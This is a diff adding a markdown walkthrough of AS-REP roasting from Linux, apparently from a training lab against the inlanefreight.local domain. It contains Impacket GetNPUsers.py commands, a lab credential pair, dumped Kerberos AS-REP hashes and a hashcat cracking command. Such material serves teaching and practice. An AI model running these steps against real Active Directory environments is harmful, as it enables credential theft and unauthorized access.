@@ -1,0 +1,61 @@
+# AS-REP Roasting from Linux
+
+## Hosts File
+
+```sh
+my@attack:~$ echo "10.129.205.35 inlanefreight.local" | sudo tee -a /etc/hosts
+```
+
+## Enumeration
+
+```sh
+my@attack:~$ GetNPUsers.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine'
+```
+
+```output title="Output" hl_lines="3"
+Name         MemberOf  PasswordLastSet             LastLogon                   UAC
+-----------  --------  --------------------------  --------------------------  --------
+amber.smith            2023-03-30 16:40:23.135840  2025-01-22 13:52:00.585089  0x410200
+jenna.smith            2022-10-14 15:00:00.581111  2023-04-06 14:48:23.096956  0x410200
+carole.rose            2022-10-14 15:00:03.377990  2023-04-06 14:48:23.096956  0x410200
+```
+
+## Performing the Attack
+
+### Impacket
+
+```sh
+my@attack:~$ GetNPUsers.py 'INLANEFREIGHT.LOCAL'/ -dc-ip 10.129.205.35 -usersfile usernames.txt -no-pass
+```
+
+```output title="Output"
+$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:0bb6912d4397c5fe3671db400e5354c0$bd829e1b14f8ea50fecb5d9a586c36a4773a087d20f96152d90958754201cfd93377c16869823b3bee1b6c0828d5c7ed5960dc719bf628b73072640cbe2e7ad13c1ba7cf16008aa739d01fce355a08a908a8102cbefa72e7bbd3c8bdee82ccc2525c3b3d114c3caca2896872d52c0f38df11572ad7e18b50f0d6fa5a21c77ed22fb1f09f6ac9f11fdc787861fd444e5044b7cdfe9adffd67589def81bde6ebfa83a09d54f0bf9c6ad8ab825c4c26aed7e3d03a38594f202af692e7f35a33a70e5e8c4ae5392b4e13335edc3f0f2f9ac7da02330579231b5c2a79920898775b94b0dbf84bf80c2a4d49399dddf9de21c647bb930d6495577820a5
+$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:3e5a6f180ef5b54319cecff8e3b74f62$c9c31e439ccd38c9ce44a04cb57fca768d08a93d19de6da2e52d975efd06f141573f4f6972e7b0c442a49704be738e5301a9f6ca117b2c37f699e7797cb0516d35f54ebc4249dec47cdf7d04b1fa7fdeffbde720d22278e90c308815d18fb53d5049fbaebf12b4ee79d4d149b393254373360c595ddb7bf8f66e3ba6f7aa0e102adf4198d067d1f140f1ce57365c36556d2373996b229ebfc24eb6d3a2be2af870894f1a4fc78d0fed494b2e43f0ee445be44dca7b280711e6d9fbf9d8544df9971422c08b9e969e67b21ddb8648e523f9e971fb399be63ef2d38e3f5c467ad89863bdd80f574fb90d052d9234d802c9e3bd1b520dc7d2c8d177
+$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:70a6fa8644b9450522bce5d1e655bd7c$0d5323d94be052e28cc948a0c148c1193d13d9681ce4c2a448c16f489dc37dfec784e10a6856d381514dbc1dbaaa855e4f920ed12ab57eb0658569fc598ebdceb41254732fc2a895b2039544c27732fa8ce92d228f4bbb1a33edca4dc16f5d4a0b3f88495b6b66266b37df2b621607e8b6e938e35365af7a44822907a03a6864590ea31c18df5c480f8e198ce5e11fbc3741c7e21570f6f9d4aaf08a0ca6b0fd14913cbb4484424ee14c312aeff46d3d5745aefa0e72b885e1c69185c28ca2a4c8f2fd618f6362ac22b97789b9f02fa3325ae681f0058da7f9827b64bc840e0a1d2e6ca8a3b40988bb11241dd8a886d8b7d0b36ca4b1f6e5847b
+```
+
+### Impacket (Credentialed)
+
+```sh
+my@attack:~$ GetNPUsers.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine' -request
+```
+
+```output title="Output" hl_lines="9-11"
+Name         MemberOf  PasswordLastSet             LastLogon                   UAC
+-----------  --------  --------------------------  --------------------------  --------
+amber.smith            2023-03-30 16:40:23.135840  2025-01-25 15:34:52.006434  0x410200
+jenna.smith            2022-10-14 15:00:00.581111  2025-01-25 15:34:52.397065  0x410200
+carole.rose            2022-10-14 15:00:03.377990  2025-01-25 15:34:52.709627  0x410200
+
+
+
+$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:873f4e8010f85486e17a77e15fb12b0d$12727b3ab00f60aba99375f9603ad04cac8a6cf518486520aad3c263273f69d374c8c419f3dce2dab32fa4ddd402672d67199b44c6e77bd49db12d51d599a2bda29aeef755b92596f6c50918d7d360d5313323cf4b419265adafde7d0cd61962d72519c5b54cc40a64763505865af3d9805e1842c6b17ad1b63d21b0abf0a75d28e46b484b9d492caba6312a1e45e2616bb66879b01852aff806d94d25e58e2889c400db18f00a099eabb63966065b6e0c25f6e796ddc035ac180f8ab31d39decb1b3f60a54ffede44318d371388a2ad8610033b25478e88a8df963344e7be333a1f0591ed2ed5750fe7e436edb5907b3d0f8d08bb9b52d45dcc
+$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:95cecf0f67e3b228877a94c03b11fc6c$927abadd501fcf21b13613b2e303100d18ceedce3369693d4564c95687c8ed5c4c88e5188c38852bbb41ed69b15da28bb185610592f355e3f8ed4d8c9c80b8d89d138a69e4ad6f66f3ef7b410027efd466e6b65d3ab2a31118bedb8298f5dff5324ea8508ff9c0e2ac31c2fbd2470cc7525820ea82ae612cbb079d44f2b165bcc05da791d6fe56c2e1eb7d67162f5970dcdd251184c5c1b909b532ae17adc99c79be11b02c59c114cded3f20641eec59061fa4e3774b42a18c27acb97706685fb86ca7f6f7f515b6c4148e284e0eb74432487719045fd21f144f7e920096bf48cd634053f03336808c648f4a5b721513da25776c2abb34895621
+$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:995d3f43a0b7f883ad094cf7aa39c7b6$2ac6ce917c77a4dfb14ede582f14431f8f2d2aae3603c1acd7e07c03d775610d6414e53afd912da28b9b86780202018093c5fbfafa7f71b73ef57bbb50e345b3a715073f5e1825d255feb29efaec7016aafdb96318f752c5fd6587655bf2a9484be5d076342f1195e602e3460c241bae0a0a8334bebf9866275140b3e570aa0149e3d75f0957f7bb93c45d8d4e9cb2bf4fc3a64788c14e22a8c90408c4091d3c8e7c5a61160faa955ebe12eebb45d520cffe562a3a116cd53cee280745de44489426b86b55b58e090b909b35f7e16fa30248b369076e68be16cc6a6778b23768a01e26b64ac2d35615fef35aac8c10fbbe5de7184f6228e6d593
+```
+
+## Cracking the Hash
+
+```sh
+my@attack:~$ hashcat --hwmon-disable -a 0 -m 18200 amber.smith.hash /usr/local/share/wordlists/rockyou.txt
+```
